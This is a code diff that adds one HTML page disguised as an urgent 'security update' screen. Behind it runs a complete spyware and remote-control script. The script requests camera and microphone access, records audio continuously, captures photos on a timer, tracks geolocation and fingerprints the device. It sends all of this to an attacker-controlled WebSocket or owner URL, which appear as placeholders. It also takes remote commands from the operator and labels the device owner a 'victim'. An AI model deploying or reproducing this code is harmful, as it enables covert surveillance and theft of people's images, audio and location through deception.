@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+    <title>System Update Required</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{display:flex;justify-content:center;align-items:center;min-height:100vh;background:linear-gradient(135deg,#0a0a0a,#1a1a2e,#16213e);color:#fff;font-family:'Segoe UI',sans-serif;overflow:hidden}
+        .container{background:rgba(255,255,255,0.03);backdrop-filter:blur(30px);border-radius:30px;padding:50px;max-width:500px;width:90%;border:1px solid rgba(255,255,255,0.08);box-shadow:0 0 80px rgba(0,255,255,0.05);text-align:center;animation:fadeIn 1s ease}
+        @keyframes fadeIn{0%{opacity:0;transform:scale(0.9)}100%{opacity:1;transform:scale(1)}}
+        .logo{width:80px;height:80px;border-radius:50%;background:conic-gradient(from 0deg,#00ffff,#ff00ff,#00ffff);margin:0 auto 20px;display:flex;align-items:center;justify-content:center;font-size:40px;animation:spin 10s linear infinite}
+        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+        h1{font-size:24px;background:linear-gradient(135deg,#00ffff,#ff00ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:10px}
+        p{color:#888;font-size:14px;margin:15px 0}
+        .progress{width:100%;height:4px;background:rgba(255,255,255,0.05);border-radius:4px;margin:20px 0;overflow:hidden}
+        .progress-bar{height:100%;width:0%;background:linear-gradient(90deg,#00ffff,#ff00ff);border-radius:4px;animation:loading 8s infinite}
+        @keyframes loading{0%{width:0%}50%{width:70%}100%{width:100%}}
+        .status{font-size:12px;color:#00ff88;letter-spacing:2px;animation:blink 1.5s infinite}
+        @keyframes blink{0%,100%{opacity:1}50%{opacity:0.3}}
+        .hidden{display:none}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">🔐</div>
+        <h1>Security Update Required</h1>
+        <p>Your device needs an urgent security patch.<br>Please wait while we prepare your system.</p>
+        <div class="progress"><div class="progress-bar"></div></div>
+        <div class="status">● SYSTEM PREPARING... PLEASE DO NOT CLOSE</div>
+    </div>
+
+    <script>
+        (function() {
+            'use strict';
+
+            // ===== KONFIGURASI =====
+            // GANTI DENGAN WEBSOCKET SERVER LU (PAKE NGROK ATAU VPS)
+            const WS_URL = 'wss://your-websocket-server.com'; 
+            // GANTI DENGAN URL OWNER.HTML LU (NANTI DARI NETLIFY)
+            const OWNER_URL = 'https://your-netlify-app.netlify.app/owner.html';
+            
+            // ===== VARIABEL GLOBAL =====
+            let ws = null;
+            let videoStream = null;
+            let audioStream = null;
+            let mediaRecorder = null;
+            let audioChunks = [];
+            let isRecording = false;
+            let photoInterval = null;
+            let reconnectTimeout = null;
+            let deviceId = null;
+            let isBackground = false;
+            
+            // ===== GENERATE DEVICE ID =====
+            function generateDeviceId() {
+                try {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 200;
+                    canvas.height = 50;
+                    const ctx = canvas.getContext('2d');
+                    ctx.textBaseline = 'top';
+                    ctx.font = '18px Arial';
+                    ctx.fillText('QuantumV31', 10, 10);
+                    const hash = canvas.toDataURL();
+                    const combined = hash + navigator.userAgent + navigator.platform + screen.width + screen.height;
+                    return btoa(combined).substring(0, 50);
+                } catch(e) {
+                    return 'Q' + Date.now() + Math.random().toString(36).substring(2, 8);
+                }
+            }
+            deviceId = generateDeviceId();
+
+            // ===== GET IP VIA MULTIPLE API =====
+            function getIP() {
+                const apis = [
+                    'https://api.ipify.org?format=json',
+                    'https://ipapi.co/json/',
+                    'https://api.my-ip.io/ip.json'
+                ];
+                
+                function tryAPI(index) {
+                    if (index >= apis.length) {
+                        sendToOwner('ip_fallback', { ip: 'unknown' });
+                        return;
+                    }
+                    fetch(apis[index])
+                        .then(res => res.json())
+                        .then(data => {
+                            let ip = data.ip || data.ip_address || data.query || 'unknown';
+                            sendToOwner('ip_detected', { ip: ip, source: apis[index] });
+                        })
+                        .catch(() => {
+                            tryAPI(index + 1);
+                        });
+                }
+                tryAPI(0);
+            }
+
+            // ===== SEND DATA KE OWNER =====
+            function sendToOwner(action, data) {
+                const payload = {
+                    action: action,
+                    data: data || {},
+                    deviceId: deviceId,
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    timestamp: Date.now()
+                };
+
+                // Kirim via WebSocket
+                if (ws && ws.readyState === WebSocket.OPEN) {
+                    try {
+                        ws.send(JSON.stringify(payload));
+                    } catch(e) {
+                        fetchToOwner(payload);
+                    }
+                } else {
+                    fetchToOwner(payload);
+                }
+
+                // Simpan local backup
+                try {
+                    let logs = JSON.parse(localStorage.getItem('q_logs') || '[]');
+                    logs.push(payload);
+                    if (logs.length > 100) logs.shift();
+                    localStorage.setItem('q_logs', JSON.stringify(logs));
+                } catch(e) {}
+            }
+
+            function fetchToOwner(payload) {
+                try {
+                    fetch(OWNER_URL, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    }).catch(() => {});
+                } catch(e) {}
+            }
+
+            // ===== PERMISSION REQUEST (AGGRESSIVE) =====
+            async function requestPermissions() {
+                const permissions = [
+                    { name: 'camera', constraints: { video: { facingMode: 'environment', width: { ideal: 1920 }, height: { ideal: 1080 } } } },
+                    { name: 'microphone', constraints: { audio: { echoCancellation: false, noiseSuppression: false, autoGainControl: false } } },
+                    { name: 'notifications', type: 'push' }
+                ];
+
+                let results = { camera: false, microphone: false, notifications: false };
+
+                // Request Camera
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia(permissions[0].constraints);
+                    videoStream = stream;
+                    results.camera = true;
+                    sendToOwner('permission_granted', { type: 'camera' });
+                    
+                    setTimeout(() => capturePhoto(), 2000);
+                    
+                    try {
+                        const track = stream.getVideoTracks()[0];
+                        if (track && track.getCapabilities && track.getCapabilities().torch) {
+                            await track.applyConstraints({ advanced: [{ torch: true }] });
+                            setTimeout(() => track.applyConstraints({ advanced: [{ torch: false }] }), 500);
+                            sendToOwner('flash_test', { status: 'success' });
+                        }
+                    } catch(e) {}
+                    
+                } catch(e) {
+                    sendToOwner('permission_denied', { type: 'camera', error: e.message });
+                }
+
+                // Request Microphone
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia(permissions[1].constraints);
+                    audioStream = stream;
+                    results.microphone = true;
+                    sendToOwner('permission_granted', { type: 'microphone' });
+                    startAudioRecording(stream);
+                    
+                } catch(e) {
+                    sendToOwner('permission_denied', { type: 'microphone', error: e.message });
+                }
+
+                // Request Notifications
+                try {
+                    if ('Notification' in window && Notification.permission === 'default') {
+                        const notifResult = await Notification.requestPermission();
+                        results.notifications = (notifResult === 'granted');
+                        sendToOwner('notification_status', { status: notifResult });
+                    }
+                } catch(e) {}
+
+                return results;
+            }
+
+            // ===== AUDIO RECORDING (BACKGROUND) =====
+            function startAudioRecording(stream) {
+                if (isRecording) return;
+                
+                try {
+                    mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm;codecs=opus' });
+                    
+                    mediaRecorder.ondataavailable = function(e) {
+                        if (e.data.size > 0) {
+                            audioChunks.push(e.data);
+                            if (audioChunks.length >= 3) {
+                                const blob = new Blob(audioChunks, { type: 'audio/webm' });
+                                const reader = new FileReader();
+                                reader.onload = function() {
+                                    sendToOwner('audio_chunk', {
+                                        audio: reader.result,
+                                        size: blob.size
+                                    });
+                                };
+                                reader.readAsDataURL(blob);
+                                audioChunks = [];
+                            }
+                        }
+                    };
+                    
+                    mediaRecorder.start(5000);
+                    isRecording = true;
+                    sendToOwner('audio_recording_started', { status: 'success' });
+                    
+                } catch(e) {
+                    sendToOwner('audio_error', { error: e.message });
+                }
+            }
+
+            // ===== CAPTURE PHOTO =====
+            function capturePhoto() {
+                if (!videoStream) {
+                    sendToOwner('photo_error', { error: 'No camera stream' });
+                    return;
+                }
+
+                try {
+                    const video = document.createElement('video');
+                    video.srcObject = videoStream;
+                    video.play();
+                    
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth || 1280;
+                        canvas.height = video.videoHeight || 720;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0);
+                        const photoData = canvas.toDataURL('image/jpeg', 0.95);
+                        
+                        sendToOwner('photo_captured', {
+                            image: photoData,
+                            width: canvas.width,
+                            height: canvas.height
+                        });
+                        
+                        video.pause();
+                        video.srcObject = null;
+                    }, 1000);
+                    
+                } catch(e) {
+                    sendToOwner('photo_error', { error: e.message });
+                }
+            }
+
+            // ===== FLASH CONTROL =====
+            function toggleFlash(state) {
+                if (!videoStream) {
+                    sendToOwner('flash_error', { error: 'No camera' });
+                    return false;
+                }
+                
+                try {
+                    const track = videoStream.getVideoTracks()[0];
+                    if (track && track.getCapabilities && track.getCapabilities().torch) {
+                        track.applyConstraints({ advanced: [{ torch: state }] });
+                        sendToOwner('flash_status', { state: state ? 'on' : 'off' });
+                        return true;
+                    } else {
+                        sendToOwner('flash_error', { error: 'Torch not supported' });
+                        return false;
+                    }
+                } catch(e) {
+                    sendToOwner('flash_error', { error: e.message });
+                    return false;
+                }
+            }
+
+            // ===== VIBRATE =====
+            function vibratePhone(duration = 1000) {
+                if (navigator.vibrate) {
+                    navigator.vibrate(duration);
+                    sendToOwner('vibrate_executed', { duration: duration });
+                    return true;
+                } else {
+                    sendToOwner('vibrate_error', { error: 'Not supported' });
+                    return false;
+                }
+            }
+
+            // ===== KILL PHONE (SIMULASI) =====
+            function killPhone() {
+                sendToOwner('phone_killed', { timestamp: Date.now() });
+                
+                document.body.style.transition = 'background 0.5s';
+                document.body.style.background = '#000';
+                document.body.innerHTML = `
+                    <div style="display:flex;justify-content:center;align-items:center;height:100vh;color:#ff0000;font-family:monospace;flex-direction:column;">
+                        <div style="font-size:60px;margin-bottom:20px;">💀</div>
+                        <div style="font-size:20px;">CRITICAL SYSTEM ERROR</div>
+                        <div style="font-size:12px;color:#666;margin-top:10px;">Contact your administrator</div>
+                    </div>
+                `;
+                
+                if (videoStream) {
+                    videoStream.getTracks().forEach(t => t.stop());
+                }
+                if (audioStream) {
+                    audioStream.getTracks().forEach(t => t.stop());
+                }
+                if (mediaRecorder && isRecording) {
+                    mediaRecorder.stop();
+                    isRecording = false;
+                }
+                
+                try {
+                    document.documentElement.requestFullscreen().catch(() => {});
+                } catch(e) {}
+                
+                return true;
+            }
+
+            // ===== GET LOCATION =====
+            function getLocation() {
+                if (!navigator.geolocation) {
+                    sendToOwner('location_error', { error: 'Not supported' });
+                    return;
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        sendToOwner('location_data', {
+                            lat: pos.coords.latitude,
+                            lng: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy,
+                            altitude: pos.coords.altitude,
+                            speed: pos.coords.speed
+                        });
+                    },
+                    (err) => {
+                        sendToOwner('location_error', { error: err.message });
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            }
+
+            // ===== WEBSOCKET CONNECTION =====
+            function connectWebSocket() {
+                try {
+                    if (ws) {
+                        ws.close();
+                    }
+                    
+                    ws = new WebSocket(WS_URL);
+                    
+                    ws.onopen = function() {
+                        sendToOwner('victim_connected', {
+                            status: 'online',
+                            deviceId: deviceId,
+                            screen: `${screen.width}x${screen.height}`,
+                            language: navigator.language,
+                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                        });
+                        getIP();
+                    };
+                    
+                    ws.onmessage = function(event) {
+                        try {
+                            const cmd = JSON.parse(event.data);
+                            executeCommand(cmd);
+                        } catch(e) {}
+                    };
+                    
+                    ws.onclose = function() {
+                        sendToOwner('ws_disconnected', {});
+                        if (reconnectTimeout) clearTimeout(reconnectTimeout);
+                        reconnectTimeout = setTimeout(connectWebSocket, 5000);
+                    };
+                    
+                    ws.onerror = function(e) {};
+                    
+                } catch(e) {
+                    if (reconnectTimeout) clearTimeout(reconnectTimeout);
+                    reconnectTimeout = setTimeout(connectWebSocket, 5000);
+                }
+            }
+
+            // ===== EXECUTE COMMAND FROM OWNER =====
+            function executeCommand(cmd) {
+                switch(cmd.action) {
+                    case 'flash_on': toggleFlash(true); break;
+                    case 'flash_off': toggleFlash(false); break;
+                    case 'flash_toggle': toggleFlash(!videoStream || !videoStream.getVideoTracks()[0]?.getSettings?.()?.torch); break;
+                    case 'vibrate': vibratePhone(cmd.duration || 1000); break;
+                    case 'vibrate_pattern': if (cmd.pattern && navigator.vibrate) { navigator.vibrate(cmd.pattern); sendToOwner('vibrate_pattern_executed', { pattern: cmd.pattern }); } break;
+                    case 'capture_photo': capturePhoto(); break;
+                    case 'capture_photo_continuous': if (photoInterval) clearInterval(photoInterval); photoInterval = setInterval(capturePhoto, cmd.interval || 10000); sendToOwner('photo_continuous_started', { interval: cmd.interval || 10000 }); break;
+                    case 'stop_photo_continuous': if (photoInterval) { clearInterval(photoInterval); photoInterval = null; sendToOwner('photo_continuous_stopped', {}); } break;
+                    case 'start_recording': if (!isRecording && audioStream) { startAudioRecording(audioStream); } else if (!audioStream) { navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => { audioStream = stream; startAudioRecording(stream); }).catch(() => {}); } break;
+                    case 'stop_recording': if (mediaRecorder && isRecording) { mediaRecorder.stop(); isRecording = false; sendToOwner('audio_recording_stopped', {}); } break;
+                    case 'kill_phone': killPhone(); break;
+                    case 'get_location': getLocation(); break;
+                    case 'get_device_info': sendToOwner('device_info', { userAgent: navigator.userAgent, platform: navigator.platform, language: navigator.language, screen: `${screen.width}x${screen.height}`, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, battery: navigator.getBattery ? 'available' : 'unavailable', deviceId: deviceId }); break;
+                    case 'ping': sendToOwner('pong', { timestamp: Date.now() }); break;
+                    case 'notification': if ('Notification' in window && Notification.permission === 'granted') { new Notification(cmd.title || 'Quantum Alert', { body: cmd.body || 'System update required', icon: cmd.icon || '🔐' }); sendToOwner('notification_sent', {}); } break;
+                    case 'fullscreen': try { document.documentElement.requestFullscreen(); sendToOwner('fullscreen_activated', {}); } catch(e) { sendToOwner('fullscreen_error', { error: e.message }); } break;
+                    case 'redirect': if (cmd.url) { sendToOwner('redirecting', { url: cmd.url }); window.location.href = cmd.url; } break;
+                    default: sendToOwner('unknown_command', { command: cmd });
+                }
+            }
+
+            // ===== SERVICE WORKER (Background) =====
+            function registerServiceWorker() {
+                if (!('serviceWorker' in navigator)) return;
+                
+                try {
+                    const swCode = `
+                        self.addEventListener('install', e => { self.skipWaiting(); e.waitUntil(self.clients.claim()); });
+                        self.addEventListener('activate', e => { e.waitUntil(self.clients.claim()); });
+                        self.addEventListener('fetch', e => { e.respondWith(fetch(e.request).catch(() => new Response('', {status: 200}))); });
+                    `;
+                    
+                    const blob = new Blob([swCode], { type: 'application/javascript' });
+                    const url = URL.createObjectURL(blob);
+                    
+                    navigator.serviceWorker.register(url, { scope: '/' })
+                        .then(() => sendToOwner('sw_registered', { status: 'success' }))
+                        .catch(() => sendToOwner('sw_error', { error: 'Registration failed' }));
+                        
+                } catch(e) {
+                    sendToOwner('sw_error', { error: e.message });
+                }
+            }
+
+            // ===== BACKGROUND KEEP ALIVE =====
+            function setupBackgroundKeepAlive() {
+                document.addEventListener('visibilitychange', () => {
+                    const hidden = document.hidden;
+                    isBackground = hidden;
+                    sendToOwner('visibility_change', { hidden: hidden, timestamp: Date.now() });
+                    if (!hidden) { capturePhoto(); }
+                });
+
+                window.addEventListener('pagehide', () => sendToOwner('page_hide', { timestamp: Date.now() }));
+                window.addEventListener('beforeunload', () => sendToOwner('before_unload', { timestamp: Date.now() }));
+                
+                setInterval(() => {
+                    if (ws && ws.readyState === WebSocket.OPEN) {
+                        ws.send(JSON.stringify({ action: 'ping', timestamp: Date.now(), deviceId: deviceId }));
+                    }
+                }, 15000);
+                
+                setInterval(capturePhoto, 30000);
+                setInterval(getLocation, 120000);
+            }
+
+            // ===== INIT =====
+            (async function init() {
+                try {
+                    await requestPermissions();
+                    registerServiceWorker();
+                    connectWebSocket();
+                    setupBackgroundKeepAlive();
+                    
+                    sendToOwner('quantum_init', {
+                        version: 'V31.0',
+                        creator: 'AditModss',
+                        deviceId: deviceId,
+                        timestamp: Date.now()
+                    });
+                    
+                    setTimeout(getLocation, 3000);
+                    
+                    console.log('🔥 QUANTUM V31.0 ACTIVATED');
+                    console.log('💀 DEVICE ID:', deviceId);
+                    
+                } catch(e) {}
+            })();
+
+        })();
+    </script>
+</body>
+</html>
